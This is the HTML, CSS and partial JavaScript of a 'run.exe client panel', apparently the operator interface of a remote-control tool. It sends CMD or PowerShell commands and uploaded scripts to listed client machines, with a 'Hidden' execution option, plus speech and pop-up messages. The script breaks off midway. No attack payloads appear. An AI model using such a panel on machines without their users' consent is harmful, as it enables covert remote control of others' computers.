<!DOCTYPE html>
<html>

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>run.exe client panel</title>
    <style>
        :root,
        html[data-theme="night"] {
            --bg-page: #000;
            --font-mono: 'Consolas', 'Monaco', monospace;
            --bg-panel: #0a0a0a;
            --bg-surface: #080808;
            --bg-surface-alt: #0c0c0c;
            --bg-elevated: #111;
            --bg-elevated-strong: #1a1a1a;
            --bg-hover: #222;
            --bg-overlay: rgba(0, 0, 0, 0.9);
            --bg-shadow: rgba(0, 0, 0, 1);
            --border-subtle: #333;
            --border-strong: #444;
            --border-quiet: #2a2a2a;
            --border-hover: #666;
            --text: #fff;
            --text-inverse: #000;
            --text-muted: #ccc;
            --text-soft: #999;
            --text-dim: #888;
            --text-offline: #666;
            --status-green: #fff;
            --status-yellow: #bdbdbd;
            --status-red: #444;
            --shadow-outline: 0 0 0 1px #000;
            --shadow-lg: 0 20px 50px rgba(0, 0, 0, 1);
            --shadow-glow: 0 0 10px #fff;
            --hint-bg: #333;
            --hint-fg: #fff;
            --offline-stripe: repeating-linear-gradient(135deg,
                    rgba(255, 255, 255, 0.06) 0,
                    rgba(255, 255, 255, 0.06) 5px,
                    transparent 5px,
                    transparent 14px);
        }

        html[data-theme="graphite"] {
            --bg-page: #0b0d10;
            --font-mono: 'Consolas', 'Monaco', monospace;
            --bg-panel: #12151a;
            --bg-surface: #0f1216;
            --bg-surface-alt: #171b21;
            --bg-elevated: #171b21;
            --bg-elevated-strong: #20252d;
            --bg-hover: #262c35;
            --bg-overlay: rgba(8, 10, 12, 0.9);
            --bg-shadow: rgba(0, 0, 0, 1);
            --border-subtle: #2d3440;
            --border-strong: #3a4250;
            --border-quiet: #232830;
            --border-hover: #59677a;
            --text: #f4f7fb;
            --text-inverse: #050913;
            --text-muted: #d2d8e0;
            --text-soft: #a7b0bd;
            --text-dim: #93a0af;
            --text-offline: #788395;
            --status-green: #f4f7fb;
            --status-yellow: #c2cad4;
            --status-red: #4a5563;
            --shadow-outline: 0 0 0 1px #000;
            --shadow-lg: 0 20px 50px rgba(0, 0, 0, 0.75);
            --shadow-glow: 0 0 10px rgba(244, 247, 251, 0.95);
            --hint-bg: #2a313b;
            --hint-fg: #f4f7fb;
        }

        html[data-theme="midnight"] {
            --bg-page: #050913;
            --font-mono: 'Consolas', 'Monaco', monospace;
            --bg-panel: #0c1220;
            --bg-surface: #090f1b;
            --bg-surface-alt: #11192a;
            --bg-elevated: #11192a;
            --bg-elevated-strong: #18243a;
            --bg-hover: #24304a;
            --bg-overlay: rgba(5, 9, 19, 0.9);
            --bg-shadow: rgba(0, 0, 0, 1);
            --border-subtle: #27344c;
            --border-strong: #384a67;
            --border-quiet: #1e2b40;
            --border-hover: #667a9d;
            --text: #f6f8ff;
            --text-inverse: #050913;
            --text-muted: #d5ddf2;
            --text-soft: #a6b4d1;
            --text-dim: #8fa0c2;
            --text-offline: #7282a3;
            --status-green: #f6f8ff;
            --status-yellow: #c6d0e8;
            --status-red: #4e5d7f;
            --shadow-outline: 0 0 0 1px #000;
            --shadow-lg: 0 20px 50px rgba(0, 0, 0, 0.78);
            --shadow-glow: 0 0 10px rgba(246, 248, 255, 0.95);
            --hint-bg: #2b3550;
            --hint-fg: #f6f8ff;
        }

        html[data-theme="forest"] {
            --bg-page: #08110d;
            --font-mono: 'Consolas', 'Monaco', monospace;
            --bg-panel: #101b15;
            --bg-surface: #0c1611;
            --bg-surface-alt: #14211a;
            --bg-elevated: #17261d;
            --bg-elevated-strong: #1e3227;
            --bg-hover: #294235;
            --bg-overlay: rgba(5, 16, 11, 0.9);
            --bg-shadow: rgba(0, 0, 0, 1);
            --border-subtle: #2a4537;
            --border-strong: #39604b;
            --border-quiet: #21352b;
            --border-hover: #58896d;
            --text: #f2fff6;
            --text-inverse: #07120c;
            --text-muted: #c8e2d1;
            --text-soft: #9ec4ad;
            --text-dim: #85ad97;
            --text-offline: #678b77;
            --status-green: #f2fff6;
            --status-yellow: #d2e7d9;
            --status-red: #4f6a5a;
            --shadow-outline: 0 0 0 1px #000;
            --shadow-lg: 0 20px 50px rgba(0, 0, 0, 0.78);
            --shadow-glow: 0 0 10px rgba(242, 255, 246, 0.95);
            --hint-bg: #2a4a3b;
            --hint-fg: #f2fff6;
        }

        html[data-theme="ember"] {
            --bg-page: #140b08;
            --font-mono: 'Consolas', 'Monaco', monospace;
            --bg-panel: #1d110d;
            --bg-surface: #180e0b;
            --bg-surface-alt: #261612;
            --bg-elevated: #2b1914;
            --bg-elevated-strong: #3a221b;
            --bg-hover: #513128;
            --bg-overlay: rgba(20, 11, 8, 0.9);
            --bg-shadow: rgba(0, 0, 0, 1);
            --border-subtle: #5a3529;
            --border-strong: #744334;
            --border-quiet: #472a21;
            --border-hover: #a6644f;
            --text: #fff6f2;
            --text-inverse: #1b0f0b;
            --text-muted: #f2d6ca;
            --text-soft: #ccaa9d;
            --text-dim: #b59387;
            --text-offline: #94756a;
            --status-green: #fff6f2;
            --status-yellow: #f0c9b9;
            --status-red: #765045;
            --shadow-outline: 0 0 0 1px #000;
            --shadow-lg: 0 20px 50px rgba(0, 0, 0, 0.78);
            --shadow-glow: 0 0 10px rgba(255, 246, 242, 0.95);
            --hint-bg: #623a2d;
            --hint-fg: #fff6f2;
        }

        html[data-theme="polar"] {
            --bg-page: #eef3f8;
            --font-mono: 'Consolas', 'Monaco', monospace;
            --bg-panel: #ffffff;
            --bg-surface: #f7faff;
            --bg-surface-alt: #eef4fb;
            --bg-elevated: #edf3fb;
            --bg-elevated-strong: #e3ebf7;
            --bg-hover: #dce7f5;
            --bg-overlay: rgba(22, 33, 48, 0.35);
            --bg-shadow: rgba(16, 32, 48, 0.25);
            --border-subtle: #bcc9dc;
            --border-strong: #9fb0cb;
            --border-quiet: #d3ddec;
            --border-hover: #6f86ab;
            --text: #152033;
            --text-inverse: #f4f8ff;
            --text-muted: #2d3d57;
            --text-soft: #4a5d7a;
            --text-dim: #617492;
            --text-offline: #7a8da9;
            --status-green: #152033;
            --status-yellow: #425f8e;
            --status-red: #7d90ab;
            --shadow-outline: 0 0 0 1px rgba(128, 150, 182, 0.3);
            --shadow-lg: 0 20px 50px rgba(34, 52, 78, 0.16);
            --shadow-glow: 0 0 10px rgba(90, 118, 160, 0.45);
            --hint-bg: #d8e3f2;
            --hint-fg: #152033;
            --offline-stripe: repeating-linear-gradient(135deg,
                    rgba(21, 32, 51, 0.06) 0,
                    rgba(21, 32, 51, 0.06) 5px,
                    transparent 5px,
                    transparent 14px);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        .btn-hint {
            background: var(--hint-bg);
            border-radius: 2px;
            color: var(--text);
            font-size: 10px;
            padding: 2px 5px;
        }

        .card-actions {
            display: grid;
            gap: 6px;
            grid-template-columns: repeat(4, 1fr);
            width: 100%;
        }

        .card-btn {
            background: var(--bg-elevated);
            border: 1px solid var(--border-subtle);
            border-radius: 2px;
            color: var(--text-muted);
            cursor: pointer;
            font-family: inherit;
            font-size: 11px;
            font-weight: bold;
            height: 30px;
            position: relative;
            text-align: center;
            transition: transform 160ms cubic-bezier(0.2, 0.8, 0.2, 1),
                background-color 160ms ease,
                border-color 160ms ease,
                color 160ms ease,
                opacity 160ms ease;
        }

        .card-btn .btn-hint {
            font-size: 9px;
            line-height: 1;
            padding: 1px 4px;
            pointer-events: none;
            position: absolute;
            right: 3px;
            top: 3px;
        }

        .card-btn.disabled {
            opacity: 0.3;
            pointer-events: none;
        }

        .card-btn.primary {
            background: var(--bg-elevated-strong) !important;
            border-color: var(--border-strong) !important;
            color: var(--text) !important;
        }

        .card-header {
            align-items: center;
            display: flex;
            gap: 12px;
        }

        .card-ts {
            color: var(--text-soft);
            font-size: 12px;
            height: 18px;
        }

        .card-username {
            color: var(--text);
            flex: 1;
            font-size: 15px;
            font-weight: bold;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .card-username.offline {
            color: var(--text-offline);
            font-weight: normal;
        }

        .github-link {
            align-items: center;
            color: var(--text-dim);
            display: flex;
            margin-right: 10px;
            transition: color 0.2s;
        }

        .github-link:hover {
            color: var(--text);
        }

        .grid {
            display: grid;
            gap: 10px;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
        }

        .opt-btn {
            background: var(--bg-elevated);
            border: 1px solid var(--border-subtle);
            color: var(--text-dim);
            cursor: pointer;
            flex: 1;
            font-family: inherit;
            font-size: 10px;
            font-weight: bold;
            padding: 8px;
            text-transform: uppercase;
            transition: background-color 160ms ease, border-color 160ms ease, color 160ms ease, transform 160ms cubic-bezier(0.2, 0.8, 0.2, 1);
        }

        .opt-btn.active {
            background: var(--bg-hover);
            border-color: var(--text);
            color: var(--text);
        }

        body:not(.kb-mode) .opt-btn:hover {
            background: var(--bg-hover);
            border-color: var(--text);
            color: var(--text);
        }

        .option-row {
            align-items: center;
            display: flex;
            gap: 8px;
            margin-bottom: 15px;
        }

        .shell-sep {
            color: var(--text-dim);
            font-size: 12px;
            font-weight: bold;
            opacity: 0.9;
            user-select: none;
            margin: 0 -4px;
        }

        .option-row .btn-hint {
            margin-left: 2px;
            white-space: nowrap;
        }

        .collapsible-section {
            border: 1px solid var(--border-subtle);
            border-radius: 4px;
            margin-bottom: 15px;
            overflow: hidden;
        }

        .collapsible-summary {
            align-items: center;
            background: var(--bg-elevated);
            color: var(--text);
            cursor: pointer;
            display: flex;
            font-size: 11px;
            font-weight: bold;
            gap: 8px;
            justify-content: space-between;
            list-style: none;
            padding: 10px 12px;
            text-transform: uppercase;
            user-select: none;
        }

        .collapsible-summary::-webkit-details-marker {
            display: none;
        }

        .collapsible-meta {
            color: var(--text-dim);
            font-size: 10px;
            font-weight: normal;
            letter-spacing: 0.08em;
        }

        .collapsible-meta-shell {
            align-items: center;
            display: flex;
            gap: 10px;
            text-wrap: nowrap;
        }

        .collapsible-meta-pill {
            color: var(--text-dim);
            transition: color 160ms ease, text-shadow 160ms ease;
        }

        .collapsible-meta-pill.active {
            color: var(--text);
            text-decoration: underline;
            text-decoration-color: var(--text);
            text-underline-offset: 2px;
        }

        .collapsible-body {
            background: var(--bg-panel);
            border-top: 1px solid var(--border-subtle);
            display: grid;
            gap: 12px;
            padding: 12px;
        }

        .spk-row {
            display: grid;
            gap: 8px;
        }

        .spk-row-head {
            align-items: center;
            display: flex;
            justify-content: space-between;
            gap: 10px;
        }

        .spk-row label {
            color: var(--text);
            font-size: 11px;
            font-weight: bold;
            letter-spacing: 0.08em;
            text-transform: uppercase;
        }

        .spk-value {
            color: var(--text-dim);
            font-size: 11px;
            font-weight: bold;
            min-width: 44px;
            text-align: right;
        }

        .spk-slider {
            accent-color: var(--text-dim);
            width: 100%;
        }

        #shell-section .collapsible-body {
            align-items: center;
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
        }

        #shell-section .shell-sep {
            margin: 0;
        }

        body:not(.kb-mode) .collapsible-summary:hover {
            background: var(--bg-hover);
        }

        #shell-section .collapsible-body {
            grid-template-columns: auto auto auto auto auto;
            align-items: center;
        }

        #shell-section .opt-btn {
            min-width: 58px;
        }

        .panel {
            margin: 0 auto;
            max-width: 1600px;
            min-height: 100vh;
            padding: 2rem;
        }

        .popup-actions {
            display: flex;
            gap: 10px;
        }

        .popup-box {
            background: var(--bg-panel);
            border: 1px solid var(--border-strong);
            border-radius: 4px;
            box-shadow: var(--shadow-outline), var(--shadow-lg);
            flex-shrink: 0;
            margin: auto;
            max-width: 550px;
            min-width: 300px;
            opacity: 0;
            padding: 1.5rem;
            position: relative;
            transform: translateY(10px) scale(0.985);
            transition: transform 220ms cubic-bezier(0.2, 0.8, 0.2, 1),
                opacity 220ms ease;
            width: 100%;
        }

        .popup-btn {
            align-items: center;
            background: var(--bg-elevated);
            border: 1px solid var(--border-strong);
            border-radius: 2px;
            color: var(--text);
            cursor: pointer;
            display: flex;
            font-family: inherit;
            font-size: 12px;
            font-weight: bold;
            gap: 8px;
            padding: 8px 16px;
            transition: background-color 160ms ease, border-color 160ms ease, color 160ms ease, transform 160ms cubic-bezier(0.2, 0.8, 0.2, 1);
        }

        .popup-btn.confirm {
            background: var(--text);
            border-color: var(--text);
            color: var(--text-inverse);
        }

        body:not(.kb-mode) .popup-btn:hover {
            background: var(--bg-hover);
            border-color: var(--text);
            color: var(--text);
        }

        .popup-btn.confirm:hover {
            background: var(--text-muted);
            border-color: var(--text);
            color: var(--text-inverse);
        }

        .popup-footer {
            align-items: center;
            border-top: 1px solid var(--border-subtle);
            display: flex;
            justify-content: flex-end;
            padding-top: 20px;
        }

        .popup-header {
            align-items: center;
            border-bottom: 1px solid var(--border-subtle);
            display: flex;
            justify-content: space-between;
            margin-bottom: 15px;
            padding-bottom: 10px;
        }

        .popup-input {
            background: var(--bg-page);
            border: 1px solid var(--border-strong);
            border-radius: 2px;
            color: var(--text);
            font-family: inherit;
            font-size: 14px;
            margin-bottom: 0;
            min-height: 8.5rem;
            outline: none;
            padding: 12px;
            resize: vertical;
            transition: border-color 160ms ease, box-shadow 160ms ease;
            width: 100%;
        }

        .popup-input:focus {
            border-color: var(--text-dim);
        }

        .popup-overlay {
            backdrop-filter: blur(8px);
            background: var(--bg-overlay);
            display: none;
            inset: 0;
            opacity: 0;
            overflow: auto;
            padding: 20px;
            position: fixed;
            transition: opacity 220ms ease;
            z-index: 100;
        }

        .popup-overlay.open {
            align-items: flex-start;
            display: flex;
            justify-content: center;
            opacity: 1;
        }

        .popup-overlay.open .popup-box {
            opacity: 1;
            transform: translateY(0) scale(1);
        }

        .popup-target {
            color: var(--text);
            font-size: 16px;
            font-weight: bold;
        }

        .popup-title {
            color: var(--text-soft);
            font-size: 11px;
            letter-spacing: 0.15em;
            text-transform: uppercase;
        }

        .status-green {
            background: var(--text);
            box-shadow: var(--shadow-glow);
        }

        .status-red {
            background: var(--status-red);
        }

        .status-ring {
            border-radius: 50%;
            flex-shrink: 0;
            height: 10px;
            width: 10px;
        }

        .status-yellow {
            background: var(--status-yellow);
        }

        .tab-hint {
            align-items: flex-end;
            bottom: 15px;
            color: var(--text-offline);
            display: none;
            flex-direction: column;
            font-family: inherit;
            font-size: 10px;
            gap: 4px;
            pointer-events: none;
            position: absolute;
            right: 15px;
        }

        .tab-hint-row {
            align-items: center;
            background: transparent;
            border: 0;
            color: inherit;
            cursor: pointer;
            display: flex;
            font: inherit;
            gap: 5px;
            padding: 0;
            pointer-events: auto;
        }

        .textarea-wrap {
            margin-bottom: 15px;
            position: relative;
        }

        .textarea-wrap.show-hint .tab-hint {
            display: flex;
        }

        .toolbar {
            align-items: center;
            border-bottom: 1px solid var(--border-subtle);
            display: flex;
            justify-content: space-between;
            margin-bottom: 2rem;
            padding-bottom: 1rem;
        }

        .toolbar-right {
            align-items: center;
            display: flex;
            gap: 12px;
        }

        .connect-btn {
            background: var(--bg-elevated);
            border: 1px solid var(--border-subtle);
            border-radius: 2px;
            color: var(--text);
            cursor: pointer;
            font-family: inherit;
            font-size: 11px;
            font-weight: bold;
            letter-spacing: 0.08em;
            min-width: 98px;
            padding: 6px 10px;
            text-transform: uppercase;
            transition: background-color 160ms ease, border-color 160ms ease, color 160ms ease;
        }

        .connect-btn.connected {
            border-color: var(--status-yellow);
            color: var(--status-yellow);
        }

        .connect-btn:hover {
            background: var(--bg-hover);
            border-color: var(--text);
            color: var(--text);
        }

        .theme-select {
            appearance: none;
            background: var(--bg-elevated);
            border: 1px solid var(--border-subtle);
            border-radius: 2px;
            color: var(--text);
            cursor: pointer;
            font-family: inherit;
            font-size: 11px;
            font-weight: bold;
            letter-spacing: 0.08em;
            min-width: 118px;
            padding: 6px 10px;
            text-transform: uppercase;
            transition: background-color 160ms ease, border-color 160ms ease, color 160ms ease;
        }

        .theme-select:focus {
            border-color: var(--text-dim);
            outline: none;
        }

        .theme-select:hover {
            background: var(--bg-hover);
            border-color: var(--text);
            color: var(--text);
        }

        .toolbar-title {
            color: var(--text);
            font-size: 16px;
            font-weight: bold;
            letter-spacing: 0.1em;
            text-transform: uppercase;
        }

        .user-card {
            background: var(--bg-panel);
            border: 1px solid var(--border-subtle);
            border-radius: 4px;
            cursor: default;
            display: flex;
            flex-direction: column;
            gap: 15px;
            overflow: hidden;
            padding: 1.25rem;
            position: relative;
            transition: transform 240ms cubic-bezier(0.2, 0.8, 0.2, 1),
                background-color 240ms ease,
                border-color 240ms ease,
                box-shadow 240ms ease;
            will-change: transform;
        }

        .user-card.card-enter {
            animation: card-enter 300ms cubic-bezier(0.2, 0.8, 0.2, 1) both;
        }

        @keyframes card-enter {
            from {
                opacity: 0;
                transform: translateY(8px) scale(0.985);
            }

            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        @media (prefers-reduced-motion: reduce) {
            .user-card.card-enter {
                animation: none;
            }
        }

        .user-card.offline {
            background: var(--bg-surface);
        }

        .user-card.offline .card-header,
        .user-card.offline .card-actions {
            position: relative;
            z-index: 1;
        }

        .user-card.offline .card-actions {
            z-index: 2;
        }

        .user-card.offline .card-btn {
            background: var(--bg-surface-alt);
            border-color: var(--border-quiet);
            color: var(--text-offline);
            position: relative;
            z-index: 2;
        }

        .user-card.offline .card-btn.primary {
            background: var(--bg-elevated) !important;
            border-color: var(--border-quiet) !important;
            color: var(--text-offline) !important;
        }

        .user-card.offline .card-btn[data-action="output"] {
            background: var(--bg-elevated);
            border-color: var(--border-subtle);
            box-shadow: none;
            color: var(--text-muted);
            opacity: 1;
            z-index: 3;
        }

        .user-card.offline .card-ts {
            color: var(--text-offline);
        }

        .user-card.offline::before {
            background: var(--offline-stripe);
            content: '';
            inset: 0;
            opacity: 0.35;
            pointer-events: none;
            position: absolute;
        }

        .user-card.selected {
            background: var(--bg-elevated);
            border-color: var(--border-hover);
            transform: translateY(-2px);
        }

        body {
            background: var(--bg-page);
            color: var(--text);
            font-family: var(--font-mono);
            line-height: 1.5;
            min-height: 100vh;
            overflow-x: hidden;
            user-select: none;
        }

        body:not(.kb-mode) .card-btn.primary:hover {
            background: var(--bg-hover) !important;
            border-color: var(--text) !important;
            color: var(--text) !important;
        }

        body:not(.kb-mode) .card-btn:hover {
            background: var(--bg-hover);
            border-color: var(--text);
            color: var(--text);
        }

        body:not(.kb-mode) .user-card.offline .card-btn[data-action="output"]:hover {
            background: var(--bg-hover);
            border-color: var(--text);
            color: var(--text);
        }

        body:not(.kb-mode) .user-card:hover {
            background: var(--bg-elevated);
            border-color: var(--border-hover);
            transform: translateY(-2px);
        }

        @media (max-width: 600px) {
            .btn-hint {
                display: none;
            }

            .card-actions {
                gap: 5px;
                grid-template-columns: repeat(2, 1fr);
            }

            .card-btn {
                border-radius: 3px;
                font-size: 11px;
                height: 36px;
                /* Larger tap targets */
                touch-action: manipulation;
            }

            .card-header {
                gap: 6px;
            }

            .card-ts {
                color: var(--text-offline);
                font-size: 9px;
                margin-top: 2px;
                min-height: 1.3em;
                overflow: hidden;
                text-overflow: ellipsis;
                white-space: nowrap;
            }

            .card-username {
                font-size: 12px;
                line-height: 1.3;
            }

            .grid {
                gap: 8px;
                grid-template-columns: repeat(2, 1fr);
            }

            .opt-btn {
                font-size: 12px;
                padding: 12px 8px;
            }

            #shell-section .opt-btn {
                min-width: 0;
                overflow: hidden;
                text-overflow: ellipsis;
                white-space: nowrap;
            }

            .panel {
                padding: 0.75rem;
            }

            .popup-actions {
                gap: 10px;
                width: 100%;
            }

            .popup-actions .popup-btn {
                flex: 1;
                justify-content: center;
            }

            .popup-box {
                border-bottom: none;
                border-left: none;
                border-radius: 12px 12px 0 0;
                border-right: none;
                margin: 0;
                max-width: 100%;
                min-width: 0;
                padding: 1.25rem 1.25rem calc(1.25rem + env(safe-area-inset-bottom));
                transform: translateY(100%);
                transition: transform 280ms cubic-bezier(0.2, 0.8, 0.2, 1),
                    opacity 220ms ease;
                width: 100%;
            }

            .popup-btn {
                font-size: 14px;
                min-height: 44px;
                padding: 12px 20px;
            }

            .popup-footer {
                padding-top: 16px;
            }

            .popup-input {
                font-size: 16px;
            }

            .popup-overlay {
                align-items: flex-end;
                padding: 0;
            }

            .popup-overlay.open {
                align-items: flex-end;
            }

            .popup-overlay.open .popup-box {
                opacity: 1;
                transform: translateY(0);
            }

            .status-ring {
                flex-shrink: 0;
                height: 8px;
                width: 8px;
            }

            .toolbar {
                flex-wrap: nowrap;
                gap: 8px;
                margin-bottom: 0.75rem;
            }

            .toolbar-right {
                flex-shrink: 0;
                gap: 8px;
            }

            .theme-select {
                font-size: 10px;
                min-width: 104px;
                padding: 5px 8px;
            }

            .connect-btn {
                font-size: 10px;
                min-width: 86px;
                padding: 5px 8px;
            }

            .toolbar-title {
                font-size: 12px;
                overflow: hidden;
                text-overflow: ellipsis;
                white-space: nowrap;
            }

            .user-card {
                gap: 10px;
                padding: 0.75rem;
            }
        }

        @media (min-width: 601px) and (max-width: 900px) {
            .grid {
                gap: 14px;
                grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
            }

            .panel {
                padding: 1.25rem;
            }
        }
    </style>
</head>

<body>

    <div class="panel" id="app">
        <div class="toolbar">
            <span class="toolbar-title">run.exe // client panel</span>
            <div class="toolbar-right">
                <button id="connect-btn" class="connect-btn" type="button">Connect</button>
                <select id="theme-select" class="theme-select" aria-label="Theme picker" title="Theme picker">
                    <option id="theme-random-option" value="random">Random</option>
                    <option value="night">Night</option>
                    <option value="graphite">Graphite</option>
                    <option value="midnight">Midnight</option>
                    <option value="forest">Forest</option>
                    <option value="ember">Ember</option>
                    <option value="polar">Polar</option>
                </select>
                <a href="https://github.com/yuan-miranda/run" target="_blank" class="github-link">
                    <svg height="20" width="20" viewBox="0 0 16 16" fill="currentColor">
                        <path
                            d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z">
                        </path>
                    </svg>
                </a>
            </div>
        </div>
        <div class="grid" id="user-grid">
            <div class="empty">Loading...</div>
        </div>
    </div>

    <div class="popup-overlay" id="popup-overlay">
        <div class="popup-box">
            <div class="popup-header">
                <span class="popup-title" id="popup-mode-label">COMMAND</span>
                <span class="popup-target" id="popup-target-label">TARGET_USER</span>
            </div>

            <div class="textarea-wrap" id="textarea-wrap">
                <textarea class="popup-input" id="popup-input" rows="6"></textarea>
                <span class="tab-hint" id="tab-hint">
                    <button type="button" class="tab-hint-row" id="tab-autofill-hint"><span class="btn-hint">TAB</span>
                        autofill</button>
                    <button type="button" class="tab-hint-row" id="tab-unfocus-hint"><span
                            class="btn-hint">SHIFT+TAB</span> unfocus</button>
                </span>
            </div>
            <input type="file" id="file-upload" accept=".bat,.cmd,.ps1,.txt" style="display:none;">

            <div id="vis-section" style="display:none;" class="option-row">
                <button class="opt-btn" id="vis-true" tabindex="-1">Visible</button>
                <button class="opt-btn" id="vis-false" tabindex="-1">Hidden</button>
                <span class="btn-hint">SHIFT</span>
            </div>

            <div id="voice-section" style="display:none;" class="option-row">
                <button class="opt-btn" id="voice-david" tabindex="-1">David</button>
                <button class="opt-btn" id="voice-zira" tabindex="-1">Zira</button>
                <span class="btn-hint">SHIFT</span>
            </div>

            <details id="spk-controls" class="collapsible-section spk-controls" style="display:none;">
                <summary class="collapsible-summary">
                    <span>SPK Controls</span>
                    <span class="collapsible-meta" id="spk-summary-meta">Volume 100 | Speed 0</span>
                </summary>
                <div class="collapsible-body spk-controls-body">
                    <div class="spk-row">
                        <div class="spk-row-head">
                            <label for="spk-volume">Volume</label>
                            <span class="spk-value" id="spk-volume-value">100</span>
                        </div>
                        <input id="spk-volume" class="spk-slider" type="range" min="0" max="100" step="1" value="100">
                    </div>
                    <div class="spk-row">
                        <div class="spk-row-head">
                            <label for="spk-speed">Speed</label>
                            <span class="spk-value" id="spk-speed-value">0</span>
                        </div>
                        <input id="spk-speed" class="spk-slider" type="range" min="-10" max="10" step="1" value="0">
                    </div>
                </div>
            </details>

            <details id="shell-section" class="collapsible-section" style="display:none;">
                <summary class="collapsible-summary">
                    <span>Command Tools</span>
                    <span class="collapsible-meta collapsible-meta-shell" id="shell-summary-meta">
                        <span class="collapsible-meta-pill" id="shell-summary-cmd">CMD</span>
                        <span class="collapsible-meta-pill" id="shell-summary-ps">PS1</span>
                        <span class="collapsible-meta-pill" id="shell-summary-upload">UPLOAD</span>
                        <span class="collapsible-meta-pill" id="shell-summary-pause">PAUSE</span>
                    </span>
                </summary>
                <div class="collapsible-body">
                    <button class="opt-btn" id="shell-cmd" tabindex="-1">CMD</button>
                    <button class="opt-btn" id="shell-ps" tabindex="-1">PS1</button>
                    <button class="opt-btn" id="upload-btn" tabindex="-1">Upload</button>
                    <span class="shell-sep" aria-hidden="true">|</span>
                    <button class="opt-btn" id="cmd-pause" tabindex="-1">Pause</button>
                </div>
            </details>

            <div class="popup-footer">
                <div class="popup-actions">
                    <button class="popup-btn" id="popup-cancel">
                        Cancel <span class="btn-hint">ESC</span>
                    </button>
                    <button class="popup-btn confirm" id="popup-confirm">
                        Send <span class="btn-hint">CTRL+ENTER</span>
                    </button>
                </div>
            </div>
        </div>
    </div>

    <script>
        const state = {
            rows: [],
            sortedRows: [],
            url: localStorage.getItem('supa_url'),
            apiKey: localStorage.getItem('supa_key'),
            popupMode: null,
            popupUser: null,
            selectedVoice: 'David',
            selectedVis: true,
            selectedShell: 'cmd',
            pause: false,
            activeUsername: null,
            interactionMode: null,
            lastRenderSignature: null,
            fetchInFlight: false,
            isConnected: false,
            hintUsername: null,
            isRendering: false,
            popupExampleText: '',
            selectedSpkVolume: 100,
            selectedSpkSpeed: 0,
            themeSelection: localStorage.getItem('run_theme') || 'night',
            theme: 'night'
        };

        const popupExamples = {
            speak: [
                'Audio test, all systems ready.',
                'Status update: task completed.',
                'Heads up, check your dashboard.'
            ],
            popup_msg: [
                'Reminder: save your work now.',
                'Notice: update available.',
                'Quick check: please confirm.'
            ]
        };

        const demoUsers = [
            { username: 'demo-ator', updated_at: new Date(Date.now() - 4000).toISOString(), visible: true, demo: true },
            { username: 'demo-kirk', updated_at: new Date(Date.now() - 17000).toISOString(), visible: false, demo: true },
            { username: 'demo-jordan', updated_at: new Date(Date.now() - 75000).toISOString(), visible: false, demo: true }
        ];

        const $ = id => document.getElementById(id);

        const themeNames = ['night', 'graphite', 'midnight', 'forest', 'ember', 'polar'];
        const randomThemeName = 'random';

        function formatThemeLabel(themeName) {
            return themeName.charAt(0).toUpperCase() + themeName.slice(1);
        }

        function pickRandomTheme() {
            return themeNames[Math.floor(Math.random() * themeNames.length)];
        }

        function updateRandomThemeOptionLabel(activeThemeName) {
            const randomOption = $('theme-random-option');
            if (!randomOption) return;
            randomOption.textContent = `Random (${formatThemeLabel(activeThemeName)})`;
        }

        function setStoredCredentials(url, apiKey) {
            state.url = url;
            state.apiKey = apiKey;

            if (url && apiKey) {
                localStorage.setItem('supa_url', url);
                localStorage.setItem('supa_key', apiKey);
                return;
            }

            localStorage.removeItem('supa_url');
            localStorage.removeItem('supa_key');
        }

        function setConnectionState(connected) {
            state.isConnected = !!connected;
            const connectBtn = $('connect-btn');
            if (!connectBtn) return;

            connectBtn.classList.toggle('connected', state.isConnected);
            connectBtn.textContent = state.isConnected ? 'Disconnect' : 'Connect';
            connectBtn.title = state.isConnected
                ? 'Disconnect and clear saved credentials'
                : 'Connect using URL + API Key';
        }

        function disconnectAndReset() {
            setStoredCredentials(null, null);
            setConnectionState(false);
            state.rows = [];
            state.sortedRows = [];
            state.lastRenderSignature = null;
            renderGrid();
        }

        async function validateSupabaseCredentials(url, apiKey) {
            if (!url || !apiKey) return false;

            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 7000);
            try {
                const res = await fetch(`${url}?select=username&limit=1`, {
                    headers: { apikey: apiKey, Authorization: `Bearer ${apiKey}` },
                    signal: controller.signal
                });
                return res.ok;
            } catch {
                return false;
            } finally {
                clearTimeout(timeoutId);
            }
        }

        async function connectWithCredentials(url, apiKey, { notifyOnFail = true } = {}) {
            const isValid = await validateSupabaseCredentials(url, apiKey);
            if (!isValid) {
                // Reset invalid credentials to avoid locking mobile users behind bad saved values.
                setStoredCredentials(null, null);
                setConnectionState(false);
                if (notifyOnFail) {
                    alert('Connection failed. URL/token were reset. Please reconnect.');
                }
                return false;
            }

            setStoredCredentials(url, apiKey);
            setConnectionState(true);
            fetchData();
            return true;
        }

        async function promptAndConnect() {
            const url = prompt('Supabase URL:', state.url || '');
            if (!url) return;
            const apiKey = prompt('API Key:', state.apiKey || '');
            if (!apiKey) return;

            await connectWithCredentials(url.trim(), apiKey.trim(), { notifyOnFail: true });
        }

        function applyTheme(themeName = 'night') {
            const usingRandom = themeName === randomThemeName;
            const nextTheme = usingRandom
                ? pickRandomTheme()
                : (themeNames.includes(themeName) ? themeName : 'night');

            state.themeSelection = usingRandom ? randomThemeName : nextTheme;
            state.theme = nextTheme;

            document.documentElement.dataset.theme = nextTheme;
            localStorage.setItem('run_theme', state.themeSelection);
